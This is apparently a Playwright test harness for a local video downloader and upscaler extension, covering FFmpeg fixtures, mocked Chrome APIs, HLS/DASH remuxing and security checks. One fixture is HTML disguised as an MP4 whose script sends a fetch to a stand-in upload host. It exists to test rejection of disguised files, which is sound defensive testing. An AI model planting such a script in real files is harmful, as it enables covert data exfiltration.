/** Real Chromium/FFmpeg/OPFS integration harness. Chrome extension APIs are TEST DOUBLES.
 * This is deliberately not described as a successfully installed extension test.
 */
import { chromium } from 'playwright-core';
import { createServer } from 'node:http';
import { readFile, writeFile, mkdir, stat, mkdtemp } from 'node:fs/promises';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import path from 'node:path';
import assert from 'node:assert/strict';

const root = path.resolve('.');
const results = path.join(root, 'test-results');
await mkdir(results, { recursive: true });
const fixtures = path.join(results, 'fixtures');
await mkdir(fixtures, { recursive: true });
function command(binary, args) {
  const result = spawnSync(binary, args, { encoding: 'utf8', maxBuffer: 4 * 1024 * 1024 });
  if (result.status !== 0) throw new Error(`${binary} failed: ${result.stderr?.slice(-2000)}`);
  return result.stdout;
}
command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-f', 'lavfi', '-i', 'testsrc2=size=160x90:rate=12:duration=1', '-f', 'lavfi', '-i', 'sine=frequency=440:sample_rate=44100:duration=1', '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-c:a', 'aac', '-shortest', '-y', `${fixtures}/clip.mp4`]);
command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-f', 'lavfi', '-i', 'testsrc=size=64x48', '-frames:v', '1', '-threads', '1', '-y', `${fixtures}/image.png`]);
command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-f', 'lavfi', '-i', 'color=size=8192x2', '-frames:v', '1', '-threads', '1', '-y', `${fixtures}/wide.png`]);
for (const directory of ['hls', 'dash', 'range', 'video', 'audio']) await mkdir(`${fixtures}/${directory}`, { recursive: true });
command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-i', `${fixtures}/clip.mp4`, '-c:v', 'libx264', '-g', '6', '-keyint_min', '6', '-c:a', 'aac', '-hls_time', '0.5', '-hls_playlist_type', 'vod', '-hls_segment_filename', `${fixtures}/hls/seg-%03d.ts`, '-y', `${fixtures}/hls/list.m3u8`]);
command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-i', `${fixtures}/clip.mp4`, '-map', '0', '-c', 'copy', '-seg_duration', '0.5', '-use_template', '1', '-use_timeline', '1', '-f', 'dash', '-y', `${fixtures}/dash/list.mpd`]);
command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-i', `${fixtures}/clip.mp4`, '-c', 'copy', '-hls_time', '0.5', '-hls_playlist_type', 'vod', '-hls_flags', 'single_file', '-y', `${fixtures}/range/list.m3u8`]);
command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-i', `${fixtures}/clip.mp4`, '-map', '0:v:0', '-c', 'copy', '-hls_time', '0.5', '-hls_playlist_type', 'vod', '-y', `${fixtures}/video/list.m3u8`]);
command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-i', `${fixtures}/clip.mp4`, '-map', '0:a:0', '-c', 'copy', '-hls_time', '0.5', '-hls_playlist_type', 'vod', '-y', `${fixtures}/audio/list.m3u8`]);
await writeFile(`${fixtures}/master.m3u8`, '#EXTM3U\n#EXT-X-MEDIA:TYPE=AUDIO,GROUP-ID="audio",DEFAULT=YES,URI="audio/list.m3u8"\n#EXT-X-STREAM-INF:BANDWIDTH=200000,AUDIO="audio"\nvideo/list.m3u8\n');
await writeFile(`${fixtures}/encrypted.m3u8`, '#EXTM3U\n#EXT-X-KEY:METHOD=AES-128,URI="https://invalid.example/key"\n#EXTINF:1,\nclip.mp4\n#EXT-X-ENDLIST\n');
await writeFile(`${fixtures}/protected.mpd`, '<MPD type="static" mediaPresentationDuration="PT1S"><Period><AdaptationSet mimeType="video/mp4"><ContentProtection schemeIdUri="urn:uuid:protected"/><Representation id="v" bandwidth="1"><BaseURL>https://invalid.example/private.mp4</BaseURL></Representation></AdaptationSet></Period></MPD>');
await writeFile(`${fixtures}/malicious.mp4`, '<html><script>fetch("https://invalid.example/upload")</script></html>');
const originalHash = createHash('sha256').update(await readFile(`${fixtures}/clip.mp4`)).digest('hex');

const types = { '.html': 'text/html', '.css': 'text/css', '.js': 'text/javascript', '.mjs': 'text/javascript', '.wasm': 'application/wasm', '.png': 'image/png', '.mp4': 'video/mp4', '.json': 'application/json', '.m3u8': 'application/vnd.apple.mpegurl', '.mpd': 'application/dash+xml', '.ts': 'video/mp2t' };
const server = createServer(async (request, response) => {
  try {
    const name = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);
    if (name.includes('..') || name.includes('\\')) { response.writeHead(403).end(); return; }
    const target = name.startsWith('/fixtures/') ? path.join(fixtures, name.slice('/fixtures/'.length)) : path.join(root, 'dist', name);
    const bytes = await readFile(target);
    if (request.headers.range) {
      const range = request.headers.range.match(/^bytes=(\d+)-(\d+)$/);
      if (!range || Number(range[2]) >= bytes.length) { response.writeHead(416).end(); return; }
      const start = Number(range[1]), end = Number(range[2]);
      response.writeHead(206, { 'Content-Type': types[path.extname(target)] ?? 'application/octet-stream', 'Content-Range': `bytes ${start}-${end}/${bytes.length}`, 'Content-Length': end - start + 1 });
      response.end(bytes.subarray(start, end + 1)); return;
    }
    response.writeHead(200, { 'Content-Type': types[path.extname(target)] ?? 'application/octet-stream', 'Cache-Control': 'no-store' }); response.end(bytes);
  } catch { response.writeHead(404).end('Not found'); }
});
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
const origin = `http://127.0.0.1:${server.address().port}`;
const browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH ?? '/usr/bin/chromium', headless: true, args: ['--no-sandbox'] });
const context = await browser.newContext({ acceptDownloads: true, viewport: { width: 1100, height: 1000 } });
const outcomes = [];
const outbound = [];
await context.route('**/*', route => {
  const url = route.request().url();
  if (url.startsWith(origin + '/') || url.startsWith('blob:') || url.startsWith('data:')) return route.continue();
  outbound.push(url); return route.abort();
});
await context.addInitScript(() => {
  const listeners = () => {
    const handlers = [];
    return { addListener(fn) { handlers.push(fn); }, removeListener(fn) { const index = handlers.indexOf(fn); if (index >= 0) handlers.splice(index, 1); }, fire(...args) { for (const fn of handlers) fn(...args); } };
  };
  const storageKey = 'VDH_TEST_CHROME_STORAGE';
  const read = () => JSON.parse(localStorage.getItem(storageKey) ?? '{}');
  const downloads = new Map(); let sequence = 0; let hasOffscreen = false;
  const api = {
    runtime: { id: 'test-double-only', getURL: path => `${location.origin}/${path.replace(/^\//, '')}`, onInstalled: listeners(), onStartup: listeners(), onMessage: listeners(), sendMessage: async message => {
      if (message.scope === 'my-video-app/offscreen') {
        const module = await import('/local/offscreen.js');
        if (message.type === 'prepare') { try { return await module.prepareLocal(message.id, message.url, message.kind); } catch (error) { await module.disposeLocal(message.id); return { ok: false, error: error.message }; } }
        if (message.type === 'cancel') { module.cancelLocal(message.id); return { ok: true }; }
        if (message.type === 'dispose') { await module.disposeLocal(message.id); return { ok: true }; }
      }
      const background = await import('/local/background.js');
      const sender = { id: 'test-double-only', url: `${location.origin}/${message.type === 'preparing-progress' ? 'local/offscreen.html' : 'local/index.html'}` };
      if (message.type === 'capture') { sender.url = `${location.origin}/example-page`; sender.tab = { id: 7 }; }
      return background.handleLocalMessage(message, sender);
    } },
    extension: { inIncognitoContext: false },
    storage: { local: {
      get: async key => { const data = read(); if (!key) return data; if (typeof key === 'string') return { [key]: data[key] }; return Object.fromEntries(key.map(k => [k, data[k]])); },
      set: async values => { localStorage.setItem(storageKey, JSON.stringify({ ...read(), ...values })); },
    } },
    notifications: {
      onClicked: listeners(), onButtonClicked: listeners(), clear: async () => true,
      create: async (id, options) => { localStorage.setItem('VDH_TEST_NOTIFICATION', JSON.stringify({ id, options })); return id; },
    },
    contextMenus: { onClicked: listeners(), create() {} },
    tabs: { create: async options => options, query: async () => [{ id: 7, url: `${location.origin}/example-page`, active: true, incognito: false }], get: async id => ({ id, url: `${location.origin}/example-page`, incognito: false }), onRemoved: listeners(), onUpdated: listeners(), onActivated: listeners() },
    webRequest: { onHeadersReceived: listeners() }, commands: { onCommand: listeners() },
    offscreen: { Reason: { BLOBS: 'BLOBS', WORKERS: 'WORKERS', DOM_PARSER: 'DOM_PARSER' }, hasDocument: async () => hasOffscreen, createDocument: async () => { hasOffscreen = true; } },
    sidePanel: { setPanelBehavior: async () => {} }, action: { setPopup: async () => {} },
    downloads: { onChanged: listeners(), download: async options => {
      const link = document.createElement('a'); link.href = options.url; link.download = options.filename; document.body.append(link); link.click(); link.remove();
      const id = ++sequence; downloads.set(id, { id, state: window.__holdDownloads ? 'in_progress' : 'complete', filename: options.filename, url: options.url, incognito: false }); return id;
    }, search: async query => {
      if (window.__duplicateCompletion && query.id !== undefined && downloads.get(query.id)?.state === 'complete') {
        window.__duplicateCompletion = false;
        api.downloads.onChanged.fire({ id: query.id, state: { current: 'complete' } });
        api.downloads.onChanged.fire({ id: query.id, state: { current: 'complete' } });
      }
      return query.id === undefined ? Array.from(downloads.values()) : [downloads.get(query.id)].filter(Boolean);
    }, cancel: async id => { const item = downloads.get(id); if (item) { item.state = 'interrupted'; item.error = 'USER_CANCELED'; api.downloads.onChanged.fire({ id, state: { current: 'interrupted' } }); } }, show() {} },
  };
  Object.defineProperty(window, 'chrome', { value: api, configurable: true });
});
const page = await context.newPage();
const pageErrors = [];
page.on('pageerror', error => pageErrors.push(error.message));
const checks = async (name, run) => { await run(); outcomes.push({ name, status: 'passed' }); console.log(`PASS ${name}`); };
async function openTools(target = page) { await target.goto(`${origin}/upscale/index.html`); await target.waitForFunction(() => document.querySelector('#offer')?.checked === true); }
async function convert(filename, scale, destination) {
  await page.locator('#file').setInputFiles(`${fixtures}/${filename}`);
  await page.locator('#factor').selectOption(String(scale));
  await page.locator('#start').click();
  await page.waitForFunction(() => !document.querySelector('#save').hidden || (!document.querySelector('#start').disabled && document.querySelector('#progress').value === 0), undefined, { timeout: 60_000 });
  assert.equal(await page.locator('#save').isVisible(), true, await page.locator('#status').innerText());
  const pending = page.waitForEvent('download');
  await page.locator('#save').click();
  const download = await pending;
  await download.saveAs(destination);
  assert.equal(await download.failure(), null);
  return JSON.parse(command('ffprobe', ['-v', 'error', '-show_streams', '-show_format', '-of', 'json', destination]));
}
async function remux(playlist, kind, filename) {
  const prepared = await page.evaluate(async ({ url, kind }) => {
    const offscreen = await import('/local/offscreen.js');
    const id = crypto.randomUUID();
    const result = await offscreen.prepareLocal(id, url, kind);
    return { id, ...result };
  }, { url: `${origin}/fixtures/${playlist}`, kind });
  try {
    const pending = page.waitForEvent('download');
    await page.evaluate(({ url, filename }) => { const link = document.createElement('a'); link.href = url; link.download = filename; document.body.append(link); link.click(); link.remove(); }, { url: prepared.url, filename });
    const file = await pending; await file.saveAs(`${results}/${filename}`); assert.equal(await file.failure(), null);
    const probe = JSON.parse(command('ffprobe', ['-v', 'error', '-show_streams', '-show_format', '-of', 'json', `${results}/${filename}`]));
    const video = probe.streams.find(stream => stream.codec_type === 'video');
    const audio = probe.streams.find(stream => stream.codec_type === 'audio');
    assert.equal(video.codec_name, 'h264'); assert.equal(Number(video.nb_frames), 12); assert.equal(audio.codec_name, 'aac');
    assert(Number(probe.format.duration) >= 0.9 && Number(probe.format.duration) < 1.5);
    command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-i', `${results}/${filename}`, '-f', 'null', '-']);
  } finally { await page.evaluate(async id => { const module = await import('/local/offscreen.js'); await module.disposeLocal(id); }, prepared.id); }
}
try {
  await checks('Built UI loads with CSP; actual FFmpeg Worker assets available', async () => {
    await openTools(); assert.equal(await page.title(), '업스케일링 · My Video App');
    assert.equal(await page.locator('#start').isDisabled(), true);
    assert.equal(await (await context.request.get(`${origin}/vendor/ffmpeg/ffmpeg-core.wasm`)).status(), 200);
  });
  await checks('Local install uses independent entry points without an account/activation engine', async () => {
    const manifest = JSON.parse(await readFile('dist/manifest.json', 'utf8'));
    assert.equal(manifest.background.service_worker, 'local/background.js'); assert.equal(manifest.version, '1.1.0');
    assert.equal(manifest.key, undefined); assert.equal(manifest.update_url, undefined);
    const result = await context.request.get(`${origin}/service/main.js`); assert.equal(result.status(), 404);
  });
  await checks('PNG 2x produces a real decodable 128x96 image', async () => {
    const probe = await convert('image.png', 2, `${results}/image-2x.png`);
    assert.equal(probe.streams[0].width, 128); assert.equal(probe.streams[0].height, 96);
    assert.equal(probe.streams[0].codec_name, 'png');
  });
  await checks('PNG 4x produces a real decodable 256x192 image', async () => {
    const probe = await convert('image.png', 4, `${results}/image-4x.png`);
    assert.equal(probe.streams[0].width, 256); assert.equal(probe.streams[0].height, 192);
  });
  await checks('MP4 2x preserves duration and audio in separate H.264/AAC output', async () => {
    const probe = await convert('clip.mp4', 2, `${results}/clip-2x.mp4`);
    const video = probe.streams.find(stream => stream.codec_type === 'video');
    const audio = probe.streams.find(stream => stream.codec_type === 'audio');
    assert.equal(video.width, 320); assert.equal(video.height, 180); assert.equal(video.codec_name, 'h264');
    assert.equal(Number(video.nb_frames), 12); assert.equal(audio.codec_name, 'aac');
    assert(Math.abs(Number(probe.format.duration) - 1) < 0.15);
    assert.equal(createHash('sha256').update(await readFile(`${fixtures}/clip.mp4`)).digest('hex'), originalHash);
    command('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-i', `${results}/clip-2x.mp4`, '-f', 'null', '-']);
  });
  await checks('HTML disguised as MP4 is rejected before decode', async () => {
    await page.locator('#file').setInputFiles(`${fixtures}/malicious.mp4`); await page.locator('#start').click();
    await page.waitForFunction(() => document.querySelector('#status').textContent.includes('지원하는 형식'));
    assert.equal(await page.locator('#save').isVisible(), false);
  });
  await checks('Excessive output dimensions are rejected', async () => {
    await page.locator('#file').setInputFiles(`${fixtures}/wide.png`); await page.locator('#start').click();
    await page.waitForFunction(() => document.querySelector('#status').textContent.includes('8,192'));
    assert.equal(await page.locator('#save').isVisible(), false);
  });
  await checks('Cancel terminates actual Worker and allows a new job', async () => {
    await page.locator('#file').setInputFiles(`${fixtures}/clip.mp4`); await page.locator('#start').click(); await page.locator('#cancel').click();
    assert.match(await page.locator('#status').innerText(), /취소했습니다/); assert.equal(await page.locator('#start').isDisabled(), false);
    assert.equal(await page.locator('#save').isVisible(), false);
    await convert('image.png', 2, `${results}/after-cancel.png`);
  });
  await checks('Completion hook stages successful file before original cleanup; other outcomes skipped', async () => {
    const result = await page.evaluate(async () => {
      const { offerUpscale } = await import('/hardening/service.js');
      const root = await navigator.storage.getDirectory();
      const file = await (await root.getFileHandle('finished-download.mp4', { create: true })).createWritable();
      const response = await fetch('/fixtures/clip.mp4'); await response.body.pipeTo(file);
      const args = { internalFilename: 'finished-download.mp4', filename: 'folder/completed.mp4', downloadId: 99, success: true, incognito: false };
      await offerUpscale({ ...args, success: false }); await offerUpscale({ ...args, incognito: true });
      const before = (await chrome.storage.local.get('vdh_upscale_jobs_v1')).vdh_upscale_jobs_v1 ?? [];
      await offerUpscale(args);
      const jobs = (await chrome.storage.local.get('vdh_upscale_jobs_v1')).vdh_upscale_jobs_v1;
      await root.removeEntry('finished-download.mp4');
      const dir = await root.getDirectoryHandle('vdh-upscale-v1');
      const blob = await (await dir.getFileHandle(jobs[0].id)).getFile();
      const hash = Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256', await blob.arrayBuffer()))).map(b => b.toString(16).padStart(2, '0')).join('');
      return { before: before.length, jobs, hash, notification: JSON.parse(localStorage.getItem('VDH_TEST_NOTIFICATION')) };
    });
    assert.equal(result.before, 0); assert.equal(result.jobs.length, 1); assert.equal(result.jobs[0].filename, 'completed.mp4');
    assert.equal(result.hash, originalHash); assert.match(result.notification.id, /^vdh-upscale:/);
    await page.locator('#refresh').click(); await page.waitForFunction(() => document.querySelectorAll('#jobs li').length === 1);
    await page.locator('#jobs li button').first().click();
    await page.waitForFunction(() => document.querySelector('#selected').textContent.includes('completed.mp4'));
  });
  await checks('Shared queue lock survives simultaneous offer and cleanup in two tabs', async () => {
    const second = await context.newPage(); await openTools(second);
    const stage = page.evaluate(async () => {
      const { offerUpscale } = await import('/hardening/service.js');
      const root = await navigator.storage.getDirectory();
      const file = await (await root.getFileHandle('parallel.png', { create: true })).createWritable();
      await (await fetch('/fixtures/image.png')).body.pipeTo(file);
      await offerUpscale({ internalFilename: 'parallel.png', filename: 'parallel.png', downloadId: 100, success: true, incognito: false });
      await root.removeEntry('parallel.png');
    });
    await second.locator('#refresh').click(); await stage; await second.locator('#refresh').click();
    await second.waitForFunction(() => document.querySelectorAll('#jobs li').length === 2);
    await second.close();
  });
  await checks('Opt-out skips staging; TTL and delete clean real OPFS data', async () => {
    await page.locator('#offer').uncheck();
    await page.evaluate(async () => {
      const { offerUpscale } = await import('/hardening/service.js');
      await offerUpscale({ internalFilename: 'does-not-need-to-exist', filename: 'disabled.mp4', downloadId: 101, success: true, incognito: false });
      const key = 'vdh_upscale_jobs_v1';
      const stored = (await chrome.storage.local.get(key))[key];
      stored[0].createdAt = Date.now() - 25 * 60 * 60 * 1000;
      await chrome.storage.local.set({ [key]: stored });
    });
    await page.locator('#refresh').click(); await page.waitForFunction(() => document.querySelectorAll('#jobs li').length === 1);
    await page.locator('#clear').click(); await page.waitForFunction(() => document.querySelectorAll('#jobs li').length === 0);
    const count = await page.evaluate(async () => { const dir = await (await navigator.storage.getDirectory()).getDirectoryHandle('vdh-upscale-v1'); return (await Array.fromAsync(dir.keys())).length; });
    assert.equal(count, 0); await page.locator('#offer').check();
  });
  await page.screenshot({ path: `${results}/upscaler.png`, fullPage: true });
  await checks('Independent HLS VOD remux preserves video frames and audio', () => remux('hls/list.m3u8', 'hls', 'local-hls.mp4'));
  await checks('HLS master handles its separate default audio track', () => remux('master.m3u8', 'hls', 'local-master.mp4'));
  await checks('HLS byte ranges produce a complete decodable MP4', () => remux('range/list.m3u8', 'hls', 'local-range.mp4'));
  await checks('Independent static DASH remux preserves separate video and audio tracks', () => remux('dash/list.mpd', 'dash', 'local-dash.mp4'));
  await checks('Encrypted HLS and protected DASH are rejected without any key/license requests', async () => {
    const messages = await page.evaluate(async origin => {
      const offscreen = await import('/local/offscreen.js'); const messages = [];
      for (const [path, kind] of [['encrypted.m3u8', 'hls'], ['protected.mpd', 'dash']]) {
        try { await offscreen.prepareLocal(crypto.randomUUID(), `${origin}/fixtures/${path}`, kind); messages.push('unexpected success'); }
        catch (error) { messages.push(error.message); }
      }
      return messages;
    }, origin);
    assert.equal(messages.length, 2); assert(messages.every(message => /암호화|DRM/.test(message)));
  });
  await checks('Cancelling stream preparation terminates the real worker and allows a new task', async () => {
    const message = await page.evaluate(async origin => {
      const offscreen = await import('/local/offscreen.js'); const id = crypto.randomUUID();
      const pending = offscreen.prepareLocal(id, `${origin}/fixtures/hls/list.m3u8`, 'hls');
      const timeout = setTimeout(() => offscreen.cancelLocal(id), 50);
      try { await pending; return 'unexpected success'; } catch (error) { return error.message; }
      finally { clearTimeout(timeout); await offscreen.disposeLocal(id); }
    }, origin);
    assert.match(message, /취소|abort/i);
    await remux('hls/list.m3u8', 'hls', 'local-after-cancel.mp4');
  });
  await checks('Website collectors cannot invoke download/history commands or impersonate the app', async () => {
    const result = await page.evaluate(async () => {
      const background = await import('/local/background.js'); const denied = [];
      for (const type of ['download-url', 'clear-history', 'upscale']) {
        try { await background.handleLocalMessage({ scope: 'my-video-app/local', type, url: location.origin + '/fixtures/clip.mp4' }, { id: chrome.runtime.id, url: 'https://website.example/page', tab: { id: 7 } }); denied.push(false); }
        catch { denied.push(true); }
      }
      try { await background.handleLocalMessage({ scope: 'my-video-app/local', type: 'capture', items: [] }, { id: 'other-extension', url: 'https://website.example/page', tab: { id: 7 } }); denied.push(false); }
      catch { denied.push(true); }
      return denied;
    });
    assert.deepEqual(result, [true, true, true, true]);
  });
  await checks('Media collector discovers DOM video sources without initiating downloads', async () => {
    await page.goto(`${origin}/local/index.html`);
    await page.waitForFunction(() => document.querySelector('#status').textContent.includes('미디어'));
    await page.evaluate(origin => { const video = document.createElement('video'); video.preload = 'none'; video.src = `${origin}/fixtures/clip.mp4`; document.body.append(video); }, origin);
    await page.addScriptTag({ url: `${origin}/local/collect.js` });
    const discovered = await page.evaluate(async () => { const background = await import('/local/background.js'); return background.handleLocalMessage({ scope: 'my-video-app/local', type: 'list' }, { id: chrome.runtime.id, url: chrome.runtime.getURL('local/index.html') }); });
    assert.equal(discovered.items.length, 1); assert.match(discovered.items[0].url, /clip\.mp4$/);
    assert.equal(discovered.history.length, 0);
  });
  await checks('Local app downloads detected MP4 byte-for-byte and records completion using API doubles', async () => {
    await page.goto(`${origin}/local/index.html`); await page.waitForFunction(() => document.querySelector('#status').textContent.includes('미디어'));
    assert.equal(await page.title(), 'My Video App');
    await page.evaluate(async origin => { await chrome.runtime.sendMessage({ scope: 'my-video-app/local', type: 'capture', items: [{ url: `${origin}/fixtures/clip.mp4`, title: '로컬 테스트 영상', mime: 'video/mp4', fromElement: true }] }); }, origin);
    await page.locator('#refresh').click(); await page.waitForFunction(() => document.querySelectorAll('#media li').length === 1);
    await page.evaluate(() => { window.__duplicateCompletion = true; });
    const pending = page.waitForEvent('download'); await page.locator('#media button').click();
    const file = await pending; await file.saveAs(`${results}/local-direct.mp4`);
    assert.equal(createHash('sha256').update(await readFile(`${results}/local-direct.mp4`)).digest('hex'), originalHash);
    await page.waitForFunction(async () => (await chrome.storage.local.get('my_video_app_history_v1')).my_video_app_history_v1?.[0]?.state === 'complete');
    await page.locator('#history-tab').click(); await page.waitForFunction(() => document.querySelector('#history li')?.textContent.includes('완료'));
    assert.match(await page.locator('#history').innerText(), /로컬 테스트 영상\.mp4/);
    await page.waitForFunction(async () => (await chrome.storage.local.get('vdh_upscale_jobs_v1')).vdh_upscale_jobs_v1?.length === 1);
    assert.equal(await page.evaluate(async () => (await chrome.storage.local.get('vdh_upscale_jobs_v1')).vdh_upscale_jobs_v1.length), 1);
  });
  await checks('Concurrent duplicate requests are coalesced and native cancellation updates history using API doubles', async () => {
    await page.evaluate(async () => { window.__holdDownloads = true; await chrome.storage.local.set({ vdh_upscale_offer_v1: false }); });
    const pending = page.waitForEvent('download');
    const result = await page.evaluate(async origin => {
      const background = await import('/local/background.js');
      const sender = { id: chrome.runtime.id, url: chrome.runtime.getURL('local/index.html') };
      const message = { scope: 'my-video-app/local', type: 'download-url', url: `${origin}/fixtures/clip.mp4` };
      return (await Promise.allSettled([background.handleLocalMessage(message, sender), background.handleLocalMessage(message, sender)])).map(item => item.status);
    }, origin);
    assert.deepEqual(result.sort(), ['fulfilled', 'rejected']);
    const saved = await pending; await saved.saveAs(`${results}/local-cancel-api-double.mp4`);
    await page.waitForFunction(async () => (await chrome.storage.local.get('my_video_app_history_v1')).my_video_app_history_v1.some(row => row.state === 'downloading'));
    await page.locator('#history-tab').click(); await page.getByRole('button', { name: '취소', exact: true }).click();
    await page.waitForFunction(async () => (await chrome.storage.local.get('my_video_app_history_v1')).my_video_app_history_v1.some(row => row.state === 'cancelled'));
    await page.evaluate(async () => { window.__holdDownloads = false; await chrome.storage.local.set({ vdh_upscale_offer_v1: true }); });
  });
  await checks('Clearing local history leaves downloaded files intact', async () => {
    await page.locator('#clear-history').click(); await page.waitForFunction(() => document.querySelectorAll('#history li').length === 0);
    assert.equal(createHash('sha256').update(await readFile(`${results}/local-direct.mp4`)).digest('hex'), originalHash);
  });
  await checks('Restart reconciliation releases interrupted preparation slots and cleans owned temp files using API doubles', async () => {
    const id = '12345678-1234-4123-8123-123456789abc';
    await page.evaluate(async ({ id, origin }) => {
      const file = await (await (await navigator.storage.getDirectory()).getFileHandle(`local-${id}.media`, { create: true })).createWritable();
      await file.write('temporary test input'); await file.close();
      await chrome.storage.local.set({ my_video_app_history_v1: [{ id, url: `${origin}/fixtures/clip.mp4`, filename: 'interrupted.mp4', kind: 'file', state: 'preparing', createdAt: Date.now(), incognito: false }] });
      chrome.runtime.onStartup.fire();
    }, { id, origin });
    await page.waitForFunction(async () => (await chrome.storage.local.get('my_video_app_history_v1')).my_video_app_history_v1[0]?.state === 'error');
    await page.waitForFunction(async id => { try { await (await navigator.storage.getDirectory()).getFileHandle(`local-${id}.media`); return false; } catch { return true; } }, id);
  });
  await checks('No outbound requests or page exceptions in new processing workflow', async () => { assert.deepEqual(outbound, []); assert.deepEqual(pageErrors, []); });
  await page.locator('#media-tab').click();
  await page.screenshot({ path: `${results}/local-app.png`, fullPage: true });
  const buildInfo = JSON.parse(await readFile('reports/build.json', 'utf8'));
  await writeFile('reports/browser.json', JSON.stringify({ buildSha256: buildInfo.buildSha256, browser: browser.version(), engine: 'independent-local', mode: 'localhost harness: real browser/Wasm/OPFS; Chrome extension APIs mocked', extensionInstallation: { status: 'blocked', reason: 'Chromium administrator policy: Loading of unpacked extensions is disabled by the administrator. Verified separately; policy was not changed.' }, outcomes, directFixtureSha256: originalHash, outboundRequests: outbound, pageErrors }, null, 2) + '\n');
  console.log(`${outcomes.length} browser harness checks passed. Actual extension installation remains blocked by administrator policy.`);
} finally { await context.close(); await browser.close(); await new Promise(resolve => server.close(resolve)); }
